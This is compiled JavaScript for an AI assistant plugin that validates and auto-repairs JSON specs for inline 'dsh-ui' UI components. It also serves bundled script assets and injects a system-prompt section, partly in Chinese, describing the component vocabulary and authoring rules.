			return title === void 0 ? void 0 : {
				card: "generic",
				title,
				kind: "other"
			};
		},
		presentResult(args) {
			const title = cardTitle(args);
			return title === void 0 ? void 0 : {
				card: "generic",
				title
			};
		}
	};
}
/**
* The `validate_dsh_ui` tool: a model-facing pre-flight check for the
* ```dsh-ui fence channel. The model calls it with the JSON text it is about
* to put inside a fence; it reports whether the body parses as a valid GenUI
* spec, and when it does not, WHERE it breaks and WHAT is likely wrong
* (bracket counts, common typo classes) so the model can fix and re-validate
* before emitting — turning "render a red banner after the fact" into
* "verify before you send". Purely local: no LLM, no network, no DOM.
*/
const VALIDATE_DESCRIPTION = "Validate the JSON body of a ```dsh-ui fence BEFORE emitting it — use for non-trivial specs (≥3 nodes or containing a table); skip for trivial ones (≤2 nodes). Pass the exact JSON text you are about to put inside the fence as the \"spec\" argument (a string). Returns exact JSON paths, component types, missing/type errors and safe minimal examples. Auto-repaired JSON is returned only after content-integrity validation succeeds; copy that JSON verbatim without another validation. " + GENUI_AUTHORING_RULE + GENUI_RETRY_RULE;
const VALIDATE_PARAMETERS = {
	type: "object",
	properties: { spec: {
		oneOf: [{
			type: "string",
			description: "The exact JSON text of the fence body."
		}, {
			type: "object",
			description: "The spec object (serialized before validation)."
		}],
		description: "The dsh-ui fence body to validate: pass the JSON as a string for an exact check, or as the spec object."
	} },
	required: ["spec"],
	additionalProperties: false
};
/** Read the fence-body text from the call args (string preferred, object serialized). */
function fenceTextOf(args) {
	if (typeof args === "string") return args;
	if (typeof args !== "object" || args === null) return null;
	const record = args;
	const s = "spec" in record ? record.spec : "arguments" in record ? record.arguments : void 0;
	if (typeof s === "string") return s;
	if (typeof s === "object" && s !== null) return JSON.stringify(s);
	return null;
}
/** Count structural brackets outside string literals. */
function bracketCounts(raw) {
	const counts = {
		"{": 0,
		"}": 0,
		"[": 0,
		"]": 0
	};
	let inString = false;
	let escaped = false;
	for (let i = 0; i < raw.length; i++) {
		const ch = raw[i];
		if (escaped) {
			escaped = false;
			continue;
		}
		if (inString) {
			if (ch === "\\") escaped = true;
			else if (ch === "\"") inString = false;
			continue;
		}
		if (ch === "\"") {
			inString = true;
			continue;
		}
		if (ch === "{") counts["{"] += 1;
		else if (ch === "}") counts["}"] += 1;
		else if (ch === "[") counts["["] += 1;
		else if (ch === "]") counts["]"] += 1;
	}
	return counts;
}
/** Short structural hint from bracket counts (empty when balanced). */
function bracketDiagnostic(raw) {
	const c = bracketCounts(raw);
	const diffs = [];
	if (c["{"] !== c["}"]) {
		const d = c["{"] - c["}"];
		diffs.push(`{ ×${c["{"]} / } ×${c["}"]} → ${d > 0 ? `缺 ${d} 个 }` : `多 ${-d} 个 }`}`);
	}
	if (c["["] !== c["]"]) {
		const d = c["["] - c["]"];
		diffs.push(`[ ×${c["["]} / ] ×${c["]"]} → ${d > 0 ? `缺 ${d} 个 ]` : `多 ${-d} 个 ]`}`);
	}
	return diffs.length === 0 ? "" : `  括号计数：${diffs.join("；")}（长表格最易在收尾处错位，如把 ]]}]} 写成 ]}]}]}）\n`;
}
const COMMON_CAUSES = "常见原因：① 收尾括号错位/缺失（{ 与 }、[ 与 ] 数量不相等）② 字符串值内用了半角引号 \"（中文引语请用 “” 或 「」）③ 尾随逗号 ④ 字符串未闭合";
/** Build the validate_dsh_ui tool definition (registered alongside render_ui). */
function createValidateDshUiTool() {
	return {
		name: "validate_dsh_ui",
		description: VALIDATE_DESCRIPTION,
		parameters: VALIDATE_PARAMETERS,
		output: {
			schema: {
				type: "string",
				description: "Validation verdict for the model."
			},
			render(_args, value) {
				return [{
					type: "text",
					text: String(value)
				}];
			}
		},
		async execute(args) {
			const raw = fenceTextOf(args);
			if (raw === null || raw.trim() === "") return "❌ $.spec: missing field; expected JSON text or object。" + GENUI_RETRY_RULE;
			let parsed;
			let syntaxRepairs = 0;
			try {
				parsed = JSON.parse(raw);
			} catch (error) {
				const message = error instanceof Error ? error.message : "";
				const detail = /position \d+(?: \(line \d+ column \d+\))?/.exec(message)?.[0] ?? "invalid JSON syntax";
				const repaired = completeFenceJson(raw);
				if (repaired === null) return `❌ $: JSON 解析失败：${detail}。\n${bracketDiagnostic(raw)}${COMMON_CAUSES}\n${GENUI_RETRY_RULE}`;
				parsed = JSON.parse(repaired.text);
				syntaxRepairs = repaired.repairs;
			}
			const diagnostic = diagnoseGenuiSpec(parsed);
			if (!diagnostic.ok) return `❌ 验证未通过：\n${diagnostic.errors.map((e) => "- " + e).join("\n")}\n${GENUI_RETRY_RULE}`;
			const spec = repairGenuiSpec(parsed);
			if (spec === null) return "❌ $.items (spec): missing/type error; expected array。" + GENUI_RETRY_RULE;
			const validCount = countNodes(spec);
			if (syntaxRepairs > 0) return `✅ 已自动修复 ${syntaxRepairs} 处 JSON 语法且字段完整（${validCount} 个组件），直接照抄以下 JSON，无需再验证：\n\`\`\`\n${JSON.stringify(spec)}\n\`\`\``;
			return `✅ dsh-ui spec 合法（${validCount} 个组件），可以发出围栏。`;
		},
		presentCall() {
			return {
				card: "generic",
				title: "验证 dsh-ui 围栏",
				kind: "other"
			};
		},
		presentResult() {
			return {
				card: "generic",
				title: "验证 dsh-ui 围栏"
			};
		}
	};
}
//#endregion
//#region src/plugin/skill.ts
/** Kept as a URL so a packed lib/index.js resolves the package-root resource. */
function loadGenuiSkill() {
	const relative = import.meta.url.endsWith("/src/plugin/skill.ts") ? "../../SKILL.md" : "../SKILL.md";
	const path = fileURLToPath(new URL(relative, import.meta.url));
	const raw = readFileSync(path, "utf8").replaceAll("\r\n", "\n");
	const match = /^---\n([\s\S]*?)\n---\n([\s\S]+)$/u.exec(raw);
	if (match === null) throw new Error("genui: missing skill frontmatter/body");
	const description = /^description: (".*")$/mu.exec(match[1])?.[1];
	if (description === void 0 || !/^name: genui$/mu.test(match[1])) throw new Error("genui: invalid skill metadata");
	return {
		name: "genui",
		description: JSON.parse(description),
		content: match[2].trim(),
		source: "bundled",
		provider: "dsh-genui",
		path,
		invocation: {
			modelInvocable: true,
			userInvocable: true
		},
		resourceBase: {
			kind: "directory",
			path: dirname(path)
		}
	};
}
//#endregion
//#region src/plugin/index.ts
/** Convention: tool guidance uses 100–199; bash's section is 104. */
const GENUI_SECTION_ORDER = 105;
/**
* The mermaid/three engines ship as standalone IIFE bundles under
* `lib/assets/` and are fetched by the client ONLY when a spec needs them.
* This route serves them from the plugin's own package directory through the
* host webserver service — the longest-prefix rule lets it win over the
* generic `/plugins` bundle route, and no host source change is needed. The
* service is optional at this plugin's start time (same ordering reality as
* the tools registry), so registration probes immediately AND on the
* `internal/service` event, exactly like the tools registration below.
*/
/** Route prefix under /plugins; anything under it is this plugin's asset. */
const ASSET_ROUTE_PATH = "/plugins/@omdsh-dev/dsh-genui/assets";
/** Safe flat file names only: no slashes, no traversal, js assets only. */
const ASSET_FILE_RE = /^[A-Za-z0-9][A-Za-z0-9._-]*\.js$/;
/** The handler itself (registered via the optional webServer probe). */
async function serveGenuiAsset(req, res) {
	if (req.method !== "GET" && req.method !== "HEAD") {
		res.writeHead(405);
		res.end();
		return;
	}
	let pathname;
	try {
		pathname = decodeURIComponent(new URL(req.url ?? "/", "http://x").pathname);
	} catch {
		res.writeHead(400);
		res.end();
		return;
	}
	const rel = pathname.startsWith(`${ASSET_ROUTE_PATH}/`) ? pathname.slice(36) : null;
	if (rel === null) {
		res.writeHead(404);
		res.end();
		return;
	}
	const file = rel.slice(1);
	if (!ASSET_FILE_RE.test(file)) {
		res.writeHead(404);
		res.end();
		return;
	}
	try {
		const dir = fileURLToPath(new URL("./assets/", import.meta.url));
		const body = await readFile(join(dir, file));
		res.writeHead(200, {
			"content-type": "text/javascript; charset=utf-8",
			"cache-control": "no-cache"
		});
		res.end(body);
	} catch {
		res.writeHead(404);
		res.end();
	}
}
/** The fence language description injected into every assembled system prompt.
*  Deliberately slim: the `genui` skill carries the full component→field
*  mapping; this section keeps only the contract that must always be
*  present (fence syntax, type whitelist, and critical behavioral rules). */
const GENUI_SECTION_TEXT = `You can render interactive UI components INSIDE your reply — between paragraphs — by emitting a fenced block with the language tag \`dsh-ui\` containing a JSON spec:

\`\`\`dsh-ui
{"title":"可选标题","gap":14,"items":[...]}
\`\`\`

The spec is a white-listed component tree rendered inline where the fence sits. Only these \`type\` values; the \`genui\` skill, when available, carries the full content→component mapping and per-component field details:

- 布局: text · row · col · grid · card · divider · spacer
- 展示: badge · stat · progress · list · table · keyvalue · avatar · audio · video · timeline · file-tree · breadcrumb · callout · steps · diff · json · code · copy
- 图表: chart (bars|line|donut) · echart (preset|option) · plot (函数图)
- 交互: button · input · textarea · select · checkbox · switch · slider · radio · submit · quiz · link · tabs · accordion
- 高级: mermaid (flowchart/sequence/class/gantt/pie/er/state/journey) · diagram (编辑级架构/流程图，27 种 kind) · scene3d (3D WebGL)

Rules:
- 触发: 结构化表达优于纯文本时主动用（要点、强调、对比、流程、步骤、状态、数据、演示），纯问答与一句话不套 UI；一个主题一个主组件，每次 3–8 个组件，同一数据不重复出现。
- 字段规范: ${GENUI_AUTHORING_RULE}
- JSON 严格: ≥3 节点或含 table 的围栏发出前调用 validate_dsh_ui；只有通过字段完整性检查的「已自动修复」JSON 可照抄发出，无需再验证。${GENUI_RETRY_RULE}
- 规模: ≤200 节点、嵌套≤8 层（超出被截断）；3D mesh 1–5；plot 给合理 xMin/xMax。
- LOCAL-FIRST + actions: UI 能自己做的状态变化（判卷、判题、重置、展开、选中）就地完成，零往返；action 只用于必须模型参与的事。交互组件带 "action":"name"，交互以 [genui-action] name + 组件数据回传，届时重渲染更新 UI；无 action 的按钮禁用。
- Durable state: 交互状态按「会话+内容指纹」持久化——刷新/重放恢复；重渲染相同内容保留，新内容重置。
- 卷子模式: 每题一个 radio（group+answer+explanation）+ 一个 submit（groups 全列），本地判分。
- Secrets ban: 不索取密码、API Key、Token、恢复码；需要时拒绝并解释。
- Tool channel: render_ui 工具把同一 spec 渲染为工具行卡片（交付物型界面用）；围栏用于回答内联 UI。
- Panel: "panel":true 只渲染进会话面板 dock 并原地更新；"append":true 追加合并（同标签 tabs 追加/新标签加入/尾部追加）；上限 200 节点/200 次追加，满了发 replace 重建。面板组件来的 [genui-action] 只回一个 panel:true 围栏 + 至多一行 10 字内确认，不解释、不用普通围栏；验证失败时仍遵守上述 Markdown 降级规则。`;
/**
* Register the GenUI output-language section and the render_ui tool.
* @param ctx - cordis context.
*/
const inject = ["systemPrompt"];
function apply(ctx) {
	ctx.systemPrompt.section({
		name: "genui:fence",
		order: 105,
		text: GENUI_SECTION_TEXT
	});
	let skills;
	let disposeSkill;
	const tryRegisterSkill = () => {
		const next = ctx.reflect.get("skills", false);
		if (next === skills) return;
		disposeSkill?.();
		disposeSkill = void 0;
		skills = next;
		if (next !== void 0) disposeSkill = next.register(loadGenuiSkill());
	};
	tryRegisterSkill();
	ctx.on("internal/service", (name) => {
		if (name === "skills") tryRegisterSkill();
	});
	ctx.effect(() => () => {
		disposeSkill?.();
		disposeSkill = void 0;
		skills = void 0;
	});
	let registered = false;
	const tryRegister = (value) => {
		if (registered) return;
		const tools = value ?? ctx.reflect.get("tools", false);
		if (tools === void 0) return;
		tools.register(createRenderUiTool());
		tools.register(createValidateDshUiTool());
		registered = true;
	};
	tryRegister(void 0);
	ctx.on("internal/service", (name, value) => {
		if (name === "tools") tryRegister(value);
	});
	let assetsRegistered = false;
	const tryRegisterAssets = (value) => {
		if (assetsRegistered) return;
		const webServer = value ?? ctx.reflect.get("webServer", false);
		if (webServer === void 0) return;
		webServer.register({
			kind: "prefix",
			path: ASSET_ROUTE_PATH,
			handler: serveGenuiAsset
		});
		assetsRegistered = true;
	};
	tryRegisterAssets(void 0);
	ctx.on("internal/service", (name, value) => {
		if (name === "webServer") tryRegisterAssets(value);
	});
}
//#endregion
export { GENUI_SECTION_ORDER, GENUI_SECTION_TEXT, apply, inject };
